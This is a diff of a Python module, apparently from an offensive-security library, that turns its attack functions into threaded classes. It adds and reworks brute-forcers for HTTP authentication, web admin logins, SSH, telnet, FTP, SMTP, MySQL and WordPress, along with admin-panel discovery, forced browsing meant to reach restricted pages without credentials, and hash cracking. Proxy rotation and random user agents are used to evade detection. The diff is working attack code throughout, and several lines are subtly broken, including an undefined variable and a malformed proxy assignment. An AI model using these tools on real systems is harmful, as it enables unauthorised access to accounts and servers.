@@ -1,4 +1,4 @@
-import requests,random,smtplib,telnetlib,sys,os,hashlib,base64,subprocess,time,xtelnet
+import requests,random,smtplib,telnetlib,sys,os,hashlib,base64,subprocess,time,xtelnet,os,threading
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from ftplib import FTP
@@ -11,26 +11,104 @@ import mysqlcp
 from bane.pager import *
 from bane.wp import wpadmin
 from bane.hasher import *
-def access(u,timeout=10,bypass=False,proxy=None):
- '''
-   this function isused to check if the given link is returning 200 ok response or not.
-   
-   u: the targeted link
-   timeout: (set by default to 10) timeout flag for the request
-   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)
-   proxy: (set by default to None) set a http proxy: 45.22.123.147:8080
-   
-   usage:
-
-   >>>import bane
-   >>>url='http://www.example.com/admin/'
-   >>>url+='edit.php'
-   >>>a=bane.access(url)
-   >>>if a==True:
-   ... print 'accessable'
- '''
+class http_auth_bf:
+ __slots__=["stop","finish","result"]
+ def __init__(self,u,word_list=[],logs=True,proxy=None,proxies=None,cookie=None,user_agent=None,timeout=10):
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,word_list,logs,proxy,proxies,cookie,user_agent,timeout,))
+  t.daemon=True
+  t.start()
+ def done(self):
+  return self.finish
+ def crack(self,u,word_list,logs,proxy,proxies,cookie,user_agent,timeout):
+  if user_agent:
+   us=user_agent
+  else:
+   us=random.choice(ua)
+  hed={"User-Agent":us}
+  if cookie:
+   hed.update({"Cookie":cookie})
+  prox=None
+  if proxy:
+   prox={'http':'http://'+proxy}
+  if self.proxies:
+   prox=random.choice(proxies)
+   prox={'http':'http://'+prox}
+  try:
+   if logs==True:
+    print("[*]Checking Authentication Type:")
+   resp = requests.get(u,proxies=prox,headers=hed, verify=False, timeout=timeout)
+   if 'basic' in resp.headers['WWW-Authenticate'].lower():
+    if logs==True:    
+     print("==>Basic")
+    auth_type = requests.auth.HTTPBasicAuth
+   elif 'digest' in resp.headers['WWW-Authenticate'].lower():
+    if logs==True:
+     print("==>Digest")
+    auth_type = requests.auth.HTTPDigestAuth
+   elif 'ntlm' in resp.headers['WWW-Authenticate'].lower():
+    if logs==True:
+     print("==>Ntlm")
+    auth_type = requests_ntlm.HttpNtlmAuth
+   else:
+    if logs==True:
+     print("==>Unknown type")
+    self.finish=True
+    return
+  except:
+   if logs==True:
+     print("Server doesn't support this type of authentication")
+   self.finish=True
+   return
+  for x in word_list:
+   try:
+    if self.stop==True:
+     self.finish=True
+     break
+    username=x.split(":")[0]
+    password=x.split(":")[1]
+    if logs==True:
+     print("[*]Trying: {} {}".format(username,password))
+    prox=None
+    if proxy:
+     prox={'http':'http://'+proxy}
+    if proxies:
+     prox=random.choice(proxies)
+     prox={'http':'http://'+prox}
+    if user_agent:
+     us=user_agent
+    else:
+     us=random.choice(ua)
+    hed={"User-Agent":us}
+    if cookie:
+     hed.update({"Cookie":cookie})
+    r=requests.get(u, auth=auth_type(username,password),proxies=prox,headers=hed, verify=False, timeout=timeout)
+    if (r.status_code == 200)and("wrong" not in r.text.lower())and("invalid" not in r.text.lower())and("denied" not in r.text.lower())and("unauthorized" not in r.text.lower()):
+     if logs==True:
+      print("[+]Success")
+     self.result={u:username+":"+password}
+     self.finish=True
+     break
+    else:
+     if logs==True:
+      print("[-]Fail")
+   except:
+    if logs==True:
+     print("[-]Fail")
+  self.finish=True
+  
+def access(u,timeout=10,user_agent=None,cookie=None,bypass=False,proxy=None):
  if bypass==True:
    u+='#'
+ if user_agent:
+     us=user_agent
+ else:
+     us=random.choice(ua)
+ hed={'User-Agent': us}
+ if cookie:
+     hed.update({"Cookie":cookie})
  if proxy:
   proxy={'http':'http://'+proxy}
  try:
@@ -41,43 +119,25 @@ def access(u,timeout=10,bypass=False,proxy=None):
  except Exception as e:
    pass
  return False
-"""
-   in functions below you can use a proxy in any function that takes the 'proxy' parameter with this way:
-  
-   example:
 
-   proxy='192.122.58.47:80'
-
-"""
-
-
-def admin_login(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
- '''
-   this function try to use the values you insert in the dictionary field "p" to make a POST request in the login page and check it the 
-   credentials are correct or not by checking the response code.
-   
-   u: login link
-   pl: dictionary contains input names and values: {input's name : value} => example: {'user':'ala','pass':'ala'}
-   fresh: (set by default to False) refresh html input tokens
-   
-   usage:
-
-   >>>import bane
-   >>>a=bane.admin_login('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
-   >>>if a==True:
-   ... print 'logged in!!!'
- '''
- if user_agent:
+class web_login_bruteforce:
+ __slots__=["stop","finish","result"]
+ def admin_login(self,u,pl,black,extra={},user_agent=None,cookie=None,fresh=False,timeout=10,proxy=None):
+  if user_agent:
    us=user_agent
- else:
+  else:
    us=random.choice(ua)
- if proxy:
-  proxy={'http':'http://'+proxy}
- try:
-  if fresh==True:
+  hed={'User-Agent': us}
+  if cookie:
+   hed.update({"Cookie":cookie})
+  if proxy:
+   proxy={'http':'http://'+proxy}
+  try:
+   if fresh==True:
        extr=[]
-       k=inputs(u,user_agent=us,proxy=proxy,timeout=timeout,value=True)
-       for x in k:
+       k=forms(u,user_agent=us,proxy=proxy,cookie=cookie,timeout=timeout)
+       u=k[0]["action"]
+       for x in k[0]["inputs"]:
         if (x.split(':')[1]!=''):
          extr.append(x)
        for x in extr:
@@ -89,15 +149,23 @@ def admin_login(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None)
          a=x.split(':')[0]
          b=x.split(':')[1]
          extra.update({a:b})
-  pl.update(extra)
-  se=requests.session()
-  r=se.post(u,data=pl,headers = {'User-Agent': us},allow_redirects=False,proxies=proxy,timeout=timeout, verify=False)
-  if r.status_code==302:
+   pl.update(extra)
+   r=requests.post(u,data=pl,headers = hed,allow_redirects=False,proxies=proxy,timeout=timeout, verify=False)
+   if (all( x in r.text for x in black)==False):
     return True
- except:
-  pass
- return False
-def admin_brute_force(u,word_list=[],fresh=False,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
+  except:
+   pass
+  return False
+ def done(self):
+  return self.finish
+ def __init__(self,u,username,password,word_list=[],fresh=False,logs=True,user_agent=None,cookie=None,proxy=None,proxies=None,timeout=10):
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,username,password,word_list,fresh,logs,user_agent,cookie,proxy,proxies,timeout,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,username,password,word_list,fresh,logs,user_agent,cookie,proxy,proxies,timeout):
   '''
    bruteforce admin logins
 
@@ -110,6 +178,7 @@ def admin_brute_force(u,word_list=[],fresh=False,logs=True,returning=False,proxy
   if proxies:
    proxy=random.choice(proxies)
   l1=forms(u,proxy=proxy,timeout=timeout,value=True)
+  black=[]
   if len(l1)==0:
    if logs==True:
     print("No parameters were found!!!")
@@ -117,27 +186,31 @@ def admin_brute_force(u,word_list=[],fresh=False,logs=True,returning=False,proxy
   if hu==True:
    extr=[]
    l2=[]
-   for x in l1:
+   for x in l1[0]["inputs"]:
     if (x.split(':')[1]!=''):
      extr.append(x)
     else:
      l2.append(x)
-   l=[]
-   for x in l2:
-    l.append(x.split(':')[0])
+   black=[username,password]
+   """for x in l2:
+    l.append(x.split(':')[0])"""
    for i in word_list:
+    if self.stop==True:
+     self.finish=True
+     break
     user=i.split(':')[0]
     pwd=i.split(':')[1]
-    print("[*]Trying: {} {}".format(user,pwd))
+    if logs==True:
+     print("[*]Trying: {} {}".format(user,pwd))
     exte=[]
     exte.append(user)
     exte.append(pwd)
     if proxies:
      proxy=random.choice(proxies)
     pl={}
-    for x in range(len(l)):
+    for x in range(len(black)):
      try:
-      pl.update({l[x] : exte[x]})
+      pl.update({black[x] : exte[x]})
      except:
       break
     extra={}
@@ -147,21 +220,25 @@ def admin_brute_force(u,word_list=[],fresh=False,logs=True,returning=False,proxy
       b=x.split(':')[1]
       if a not in pl:
        extra.update({a:b})
-    res=admin_login(u,pl,fresh=fresh,extra=extra,timeout=timeout,proxy=proxy)
+    if user_agent:
+     us=user_agent
+    else:
+     us=random.choice(ua)
+    res=self.admin_login(l1[0]["action"],pl,black,fresh=fresh,extra=extra,user_agent=us,cookie=cookie,timeout=timeout,proxy=proxy)
     if res==True:
      if logs==True:
       print("[+]Found!!!")
-     if returning==True:
-      op="{}:{}:{}".format(u,user,pwd)
-      return op
+     self.result.update({u:user+":"+pwd})
      break
     else:
      if logs==True:
       print("[-]Failed")
-  if returning==True:
-   return op
-def filemanager_finder(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,proxies=None):
- '''
+  self.finish=True
+
+class filemanager_finder:
+ __slots__=["stop","finish","result"]
+ def __init__(self,u,logs=True,user_agent=None,cookie=None,timeout=10,proxy=None,proxies=None):
+  '''
    u: the link: http://www.example.com
    logs: (set by default to True) the show the process and requests
    mapping: (set by default to: False) if it is set to True, it will stop the prcess when it finds the link, else: it continue for more
@@ -174,46 +251,61 @@ def filemanager_finder(u,logs=True,mapping=False,returning=False,timeout=10,prox
    >>>import bane
    >>>url='http://www.example.com/'
    >>>bane.filemanager_finder(url)
-   >>>bane.filemanager_finder(url,returning=True,mapping=False)
-'''
- k=[]
- for i in manager:
-  if proxy:
-   proxy={'http':'http://'+proxy}
-  if proxies:
-   proxy={'http':'http://'+random.choice(proxies)}
-  try:
-   if u[len(u)-1]=='/':
-    u=u[0:len(u)-1]
-   g=u+i
-   if logs==True:
-    print("[*]Trying:",g)
-   r=requests.get(g,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
-   if r.status_code == requests.codes.ok:
-    if (("Uncaught exception" not in r.text) and ("404 Not Found" not in r.text)):
-     if 'could not be found' not in r.text:
-      if logs==True:
-       print("[+]FOUND!!!")
-       k.append(g)
-      if mapping==False:
-       break
-      else:
+   '''
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,logs,user_agent,cookie,timeout,proxy,proxies,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,logs,user_agent,cookie,timeout,proxy,proxies):
+  for i in manager:
+   if self.stop==True:
+    self.finish=True
+    break
+   if proxy:
+    proxy={'http':'http://'+proxy}
+   if proxies:
+    proxy={'http':'http://'+random.choice(proxies)}
+   if user_agent:
+     us=user_agent
+   else:
+     us=random.choice(ua)
+   hed={'User-Agent': us}
+   if cookie:
+     hed.update({"Cookie":cookie})
+   try:
+    if u[len(u)-1]=='/':
+     u=u[0:len(u)-1]
+    g=u+i
+    if logs==True:
+     print("[*]Trying:",g)
+    r=requests.get(g,  headers = hed , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
+    if r.status_code == requests.codes.ok:
+     if ("Uncaught exception" not in r.text) and ("404 Not Found" not in r.text) and ('could not be found' not in r.text):
+       self.finish=True
        if logs==True:
-        print("[-]Failed")
+        print("[+]FOUND!!!")
+       self.result.update({u:g})
+       break
+     else:
+        if logs==True:
+         print("[-]Failed")
     else:
      if logs==True:
       print("[-]Failed")
-   else:
-    if logs==True:
-     print("[-]Failed")
-  except KeyboardInterrupt:
-   break
-  except Exception as e:
-   pass
- if returning==True:
-  return k
-def force_browsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None,proxies=None):
- '''
+   except KeyboardInterrupt:
+    break
+   except Exception as e:
+    pass
+  self.finish=True
+ def done(self):
+  return self.finish 
+
+class force_browsing:
+ __slots__=["stop","finish","result"]
+ def __init__(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
+  '''
    this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
    it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
    it's possible to do that and this a proof of concept that unserured cpanels with lack of right sessions configurations can be
@@ -241,34 +333,50 @@ def force_browsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php'
    ext: (set by default to: "php") it helps you to find links with the given extention, cuurentky it supports only 3 extentions: "php", "asp"
    and "aspx"( any other extention won't be used).  
 '''
- l=[]
- if u[len(u)-1]=='/':
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,timeout,logs,ext,user_agent,cookie,proxy,proxies,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
+  l=[]
+  if u[len(u)-1]=='/':
     u=u[0:len(u)-1]
- for x in innerl:
-  g=u+x+'.'+ext
-  if logs==True:
-   print("[*]Trying:",g)
-  try:
-   if proxy:
-    proxy={'http':'http://'+proxy}
-   if proxies:
-    proxy={'http':'http://'+random.choice(proxies)}
-   h=access(g,proxy=proxy)
-  except KeyboardInterrupt:
-   break
-  if h==1:
-   l.append(g)
-   if logs==True:
-    print("[+]FOUND!!!")
-   if mapping==False:
+  for x in innerl:
+   if self.stop==True:
     break
-  else:
+   g=u+x+'.'+ext
    if logs==True:
-    print("[-]Failed")
- if returning==True:
-  return l
+    print("[*]Trying:",g)
+   try:
+    if proxy:
+     proxy=proxy
+    if proxies:
+     proxyrandom.choice(proxies)
+    if user_agent:
+      us=user_agent
+    else:
+     us=random.choice(ua)
+    h=access(g,user_agent=us,cookie=cookie,proxy=proxy)
+   except KeyboardInterrupt:
+    break
+   if h==True:
+    l.append(g)
+    if logs==True:
+     print("[+]FOUND!!!")
+   else:
+    if logs==True:
+     print("[-]Failed")
+  self.result={u:l}
+  self.finish=True
+ def done(self):
+  return  self.finish
 
-def admin_panel_finder(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None,proxies=None):
+class admin_panel_finder:
+ __slots__=["stop","finish","result"]
+ def done(self):
+  return  self.finish 
  '''
    this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
    
@@ -281,55 +389,70 @@ def admin_panel_finder(u,logs=True,mapping=False,returning=False,ext='php',timeo
 
   >>>bane.admin_panel_finder('http://www.example.com',ext='aspx',timeout=5)
  '''
- links=[]
- ext=ext.strip()
- if ext.lower()=="php":
-  links=phpl
- elif ext.lower()=="asp":
-  links=aspl
- elif ext.lower()=="aspx":
-  links=aspxl
- elif ext.lower()=="js":
-  links=jsl
- elif ext=="/":
-  links=slashl
- elif ext.lower()=="cfm":
-  links=cfml
- elif ext.lower()=="cgi":
-  links=cgil
- elif ext.lower()=="brf":
-  links=brfl
- elif ext.lower()=="html":
-  links=htmll
- k=[]
- for i in links:
-  try:
-   if proxy:
-    proxy={'http':'http://'+proxy}
-   if proxies:
-    proxy={'http':'http://'+random.choice(proxies)}
-   if u[len(u)-1]=='/':
-    u=u[0:len(u)-1]
-   g=u+i
-   if logs==True:
-    print("[*]Trying:",g)
-   r=requests.get(g,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
-   if r.status_code == requests.codes.ok:
+ def __init__(self,u,logs=True,user_agent=None,cookie=None,ext='php',timeout=10,proxy=None,proxies=None):
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,timeout,logs,ext,user_agent,cookie,proxy,proxies,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,timeout=10,logs=True,ext='php',user_agent=None,cookie=None,proxy=None,proxies=None):
+  links=[]
+  ext=ext.strip()
+  if ext.lower()=="php":
+   links=phpl
+  elif ext.lower()=="asp":
+   links=aspl
+  elif ext.lower()=="aspx":
+   links=aspxl
+  elif ext.lower()=="js":
+   links=jsl
+  elif ext=="/":
+   links=slashl
+  elif ext.lower()=="cfm":
+   links=cfml
+  elif ext.lower()=="cgi":
+   links=cgil
+  elif ext.lower()=="brf":
+   links=brfl
+  elif ext.lower()=="html":
+   links=htmll
+  k=[]
+  for i in links:
+   if self.stop==True:
+    break
+   try:
+    if proxy:
+     proxy={'http':'http://'+proxy}
+    if proxies:
+     proxy={'http':'http://'+random.choice(proxies)}
+    if user_agent:
+     us=user_agent
+    else:
+     us=random.choice(ua)
+    hed={'User-Agent': us}
+    if cookie:
+     hed.update({"Cookie":cookie})
+    if u[len(u)-1]=='/':
+     u=u[0:len(u)-1]
+    g=u+i
     if logs==True:
-     print("[+]FOUND!!!")
-    k.append(g)
-    if mapping==False:
-     break
-   else:
+     print("[*]Trying:",g)
+    r=requests.get(g,headers = hed,allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
+    if r.status_code == requests.codes.ok:
+     if logs==True:
+      print("[+]FOUND!!!")
+     k.append(g)
+    else:
+     if logs==True:
+      print("[-]failed")
+   except KeyboardInterrupt:
+    break
+   except Exception as e:
     if logs==True:
-     print("[-]failed")
-  except KeyboardInterrupt:
-   break
-  except Exception as e:
-   if logs==True:
-    print ("[-]Failed")
- if returning==True:
-  return k
+     print ("[-]Failed")
+  self.result={u:k}
+  self.finish=True
 '''
   the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.
 
@@ -369,12 +492,12 @@ def telnet(u,username,password,p=23,timeout=5):
  try:
   t=xtelnet.session()
   t.connect(u,username=username,password=password,p=p,timeout=timeout)
-  t.close()
+  t.destroy()
   return True
  except:
   pass
  return False
-def ssh_linux(u,username,password,p=22,timeout=5):
+"""def ssh_linux(u,username,password,p=22,timeout=5):
  # ssh login on linux
  l="sshpass -p {} ssh -o ConnectTimeout={} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(password,timeout,p,username,u) #we use the sshpass command to send the password
  ti=time.time()
@@ -392,11 +515,12 @@ def ssh_linux(u,username,password,p=22,timeout=5):
    ssh.kill()
  except:
    pass
- if ( "ermission denied" in p[1].decode("utf-8") ):
+ if (( "denied" in p[1].decode("utf-8") )or("FATAL ERROR" in p[1].decode("utf-8")) or ("refused" in p[1].decode("utf-8").lower()):
   return False
  else:
   return True
- 
+
+  
 def ssh_win(ip,username,password,p=22,version=2,timeout=5):
  #ssh login for windows (requires putty: plink )
  try:
@@ -422,26 +546,43 @@ def ssh_win(ip,username,password,p=22,version=2,timeout=5):
      return True
  except:
   pass
- return False
-def ssh_andro(u,username,password,p=22,timeout=5):
- # ssh login on termux
- l="sshpass -p {} ssh -o ConnectTimeout={} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(password,timeout,p,username,u) #we use the sshpass command to send the password
+ return False"""
+def ssh(u,username,password,p=22,timeout=5,exchange_key=None):
+ if os.name == 'nt':
+  if exchange_key!=None:#this doesn't work on windows for some reason :(
+   return False
+  l='echo y | plink -ssh -l {} -pw {} {} -P {} "exithj"'.format(username,password,u,p)
+  sshp = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
+ else:
+  if exchange_key:
+   key="-oKexAlgorithms=+"+key
+  else:
+   key=""
+  l="sshpass -p {} ssh "+key+" -o ConnectTimeout={} -p {} -o StrictHostKeyChecking=no -l {} {} 'exithg'".format(password,timeout,p,username,u) #we use the sshpass command to send the password
+  sshp = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
  ti=time.time()
- ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
- while ssh.poll() is None:
+ while sshp.poll() is None:
    time.sleep(.1)
+   #print(ssh.stdout.readlines())
    if int(time.time()-ti)==timeout:
        try:
-        ssh.kill()
+        sshp.kill()
        except:
         pass
        return False
- p=ssh.communicate()
+ p=sshp.communicate()
  try:
-   ssh.kill()
+   sshp.kill()
  except:
    pass
- if ( "ermission denied" in p[1].decode("utf-8") ):
+ time.sleep(0.1)
+ if exchange_key==None:
+  if "no matching key exchange method found" in p[1].decode("utf-8"):
+   if os.name == 'nt':
+    return False
+   k=p[1].decode("utf-8").split("offer:")[1].strip()
+   return ssh(u,username,password,p=p,timeout=timeout,exchange_key=k)
+ if (( "denied" in p[1].decode("utf-8").lower() )or("FATAL ERROR" in p[1].decode("utf-8")) or ("refused" in p[1].decode("utf-8").lower()) or ("Unsupported KEX algorithm" in p[1].decode("utf-8")) or ("Bad SSH2 KexAlgorithms" in p[1].decode("utf-8")) ):
   return False
  else:
   return True
@@ -471,139 +612,137 @@ def mysql(u,username,password,timeout=5,p=3306):
  except Exception as e:
   pass
  return False
-def hydra(u,p=22,protocol="ssh",word_list=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
- '''
+class hydra:
+ __slots__=["stop","finish","result"]
+ def __init__(self,u,p=22,protocol="ssh",word_list=[],logs=True,exchange_key=None,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
+  '''
    this function is similar to hydra tool to bruteforce attacks on different ports.
 
    protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
 '''
- o=''
- if protocol=="telnet":
-     s=telnet
- if protocol=="ssh":
-  s=ssh_linux
-  if (sys.platform == "win32") or( sys.platform == "win64"):
-   s=ssh_win
-  if termux==True:
-   s=ssh_andro
- if protocol=="ftp":
-  s=ftp
- if protocol=="smtp":
-  s=smtp
- if protocol=="mysql":
-  s=mysql
- if protocol=="wp":
-  s=wpadmin
- for x in word_list:
-  user=x.split(':')[0].strip()
-  pwd=x.split(':')[1].strip()
-  if logs==True:
-   print("[*]Trying ==> {}:{}".format(user,pwd))
-  if protocol=="ssh":
-    if (sys.platform == "win32") or( sys.platform == "win64"):
-      r=s(u,user,pwd,timeout=timeout,p=p)
-    else:
-      r=s(u,user,pwd,timeout=timeout,p=p)
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,p,protocol,word_list,logs,exchange_key,timeout,ehlo,helo,ttls,proxy,proxies,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,p,protocol,word_list,logs,exchange_key,timeout,ehlo,helo,ttls,proxy,proxies):
+  o=''
   if protocol=="telnet":
-      r=s(u,user,pwd,timeout=timeout,p=p)
-  if (protocol=="mysql"):
-   r=s(u,user,pwd,timeout=timeout,p=p)
-  elif (protocol=="ftp"):
-   r=s(u,user,pwd,timeout=timeout)
-  elif (protocol=="wp"):
-   if proxy:
-    proxy=proxy
-   if proxies:
-    proxy=random.choice(proxies)
-   r=s(u,user,pwd,proxy=proxy,timeout=timeout)
-  elif (protocol=="smtp"):
-   r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
-  else:
-   r=s(u,user,pwd,timeout=timeout)
-  if r==True:
+     s=telnet
+  if protocol=="ssh":
+   s=ssh
+  if protocol=="ftp":
+   s=ftp
+  if protocol=="smtp":
+   s=smtp
+  if protocol=="mysql":
+   s=mysql
+  if protocol=="wp":
+   s=wpadmin
+  for x in word_list:
+   if self.stop==True:
+    break
+   user=x.split(':')[0].strip()
+   pwd=x.split(':')[1].strip()
    if logs==True:
-    print("[+]Found!!!")
-   if returning==True:
-    o="{}:{}:{}".format(u,user,pwd)
-    return o
-   break
-  else:
-   if logs==True:
-    print("[-]Failed")
- if returning==True:
-  return o
-def decrypt(u,word_list=[],md5_hash=False,sha1_hash=False,sha256_hash=False,sha224_hash=False,sha384_hash=False,sha512_hash=False,base64_hash=False,caesar_hash=False,logs=True,returning=False):
- if logs==True:
-  print('[!]hash: '+u+'\nbruteforcing has started!!!\n')
- s=False
- for x in word_list:
-  if md5_hash==True:
-   if dmd5(x,u)==True:
+    print("[*]Trying ==> {}:{}".format(user,pwd))
+   if protocol=="ssh":
+    r=s(u,user,pwd,timeout=timeout,p=p,exchange_key=exchange_key)
+   if protocol=="telnet":
+    r=s(u,user,pwd,timeout=timeout,p=p)
+   if (protocol=="mysql"):
+    r=s(u,user,pwd,timeout=timeout,p=p)
+   elif (protocol=="ftp"):
+    r=s(u,user,pwd,timeout=timeout)
+   elif (protocol=="wp"):
+    if proxy:
+     proxy=proxy
+    if proxies:
+     proxy=random.choice(proxies)
+    r=s(u,user,pwd,proxy=proxy,user_agent=user_agent,cookie=cookie,timeout=timeout)
+   elif (protocol=="smtp"):
+    r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
+   else:
+    r=s(u,user,pwd,timeout=timeout)
+   if r==True:
     if logs==True:
-     print("[+]Hash match found: "+x+" | Type: md5")
-     s=True
-     break
-    if returning==True:
-     return x
-  if sha1_hash==True:
-   if dsha1(x,u)==True:
+     print("[+]Found!!!")
+    o="{}:{}".format(user,pwd)
+    break
+   else:
     if logs==True:
-     print("[+]Hash match found: "+x+" | Type: sha1")
-     s=True
-     break
-    if returning==True:
-     return x
-  if sha256_hash==True:
-   if dsha256(x,u)==True:
-    if logs==True:
-     print("[+]Hash match found: "+x+" | Type: sha256")
-     s=True
-     break
-    if returning==True:
-     return x
-  if sha224_hash==True:
-   if dsha224(x,u)==True:
-    if logs==True:
-     print("[+]Hash match found: "+x+" | Type: sha224")
-     s=True
-     break
-    if returning==True:
-     return x
-  if sha384_hash==True:
-   if dsha384(x,u)==True:
-    if logs==True:
-     print("[+]Hash match found: "+x+" | Type: sha384")
-     s=True
-     break
-    if returning==True:
-     return x
-  if sha512_hash==True:
-   if dsha512(x,u)==True:
-    if logs==True:
-     print("[+]Hash match found: "+x+" | Type: sha512")
-     s=True
-     break
-    if returning==True:
-     return x
-  if base64_hash==True:
-   if base64decode(x)==u:
-    if logs==True:
-     print("[+]Hash match found: "+x+" | Type: base64")
-     s=True
-     break
-    if returning==True:
-     return x
-  if caesar_hash==True:
-   for i in range(1,27):
-    if dcaesar(x,i)==u:
-     if logs==True:
-      print("[+]Hash match found: "+x+" | Type: caesar | Key: "+str(i))
-      s=True
-      break
-     if returning==True:
-      return x
- if s==False:
+     print("[-]Failed")
+  self.result={u:o}
+  self.finish=True
+
+class decrypt:
+ __slots__=["stop","finish","result"]
+ def __init__(self,u,word_list=[],md5_hash=False,sha1_hash=False,sha256_hash=False,sha224_hash=False,sha384_hash=False,sha512_hash=False,base64_hash=False,caesar_hash=False,logs=False):
+  self.stop=False
+  self.finish=False
+  self.result={}
+  t=threading.Thread(target=self.crack,args=(u,word_list,md5_hash,sha1_hash,sha256_hash,sha224_hash,sha384_hash,sha512_hash,base64_hash,caesar_hash,logs,))
+  t.daemon=True
+  t.start()
+ def crack(self,u,word_list,md5_hash,sha1_hash,sha256_hash,sha224_hash,sha384_hash,sha512_hash,base64_hash,caesar_hash,logs):
   if logs==True:
-   print('[-]No match found')
-  if returning==True:
-   return None
+   print('[!]hash: '+u+'\nbruteforcing has started!!!\n')
+  for x in word_list:
+   if self.stop==True:
+    break
+   if md5_hash==True:
+    if dmd5(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: md5")
+     self.result={u:["md5:"+x]}
+     break
+   if sha1_hash==True:
+    if dsha1(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: sha1")
+     self.result={u:["sha1:"+x]}
+     break
+   if sha256_hash==True:
+    if dsha256(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: sha256")
+     self.result={u:["sha256:"+x]}
+     break
+   if sha224_hash==True:
+    if dsha224(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: sha224")
+     self.result={u:["sha224:"+x]}
+     break
+   if sha384_hash==True:
+    if dsha384(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: sha384")
+     self.result={u:["sha384:"+x]}
+     break
+   if sha512_hash==True:
+    if dsha512(x,u)==True:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: sha512")
+     self.result={u:["sha512:"+x]}
+     break
+   if base64_hash==True:
+    if base64decode(x)==u:
+     if logs==True:
+      print("[+]Hash match found: "+x+" | Type: base64")
+     self.result={u:["base64:"+x]}
+     break
+   if caesar_hash==True:
+    for i in range(1,27):
+     if dcaesar(x,i)==True:
+      if logs==True:
+       print("[+]Hash match found: "+x+" | Type: caesar | Key: "+str(i))
+      self.result={u:["caesar"+str(i)+":"+x]}
+      break
+  if self.result=={}:
+   if logs==True:
+    print('[-]No match found')
+  self.finish=True
+ def done(self):
+  return self.finish
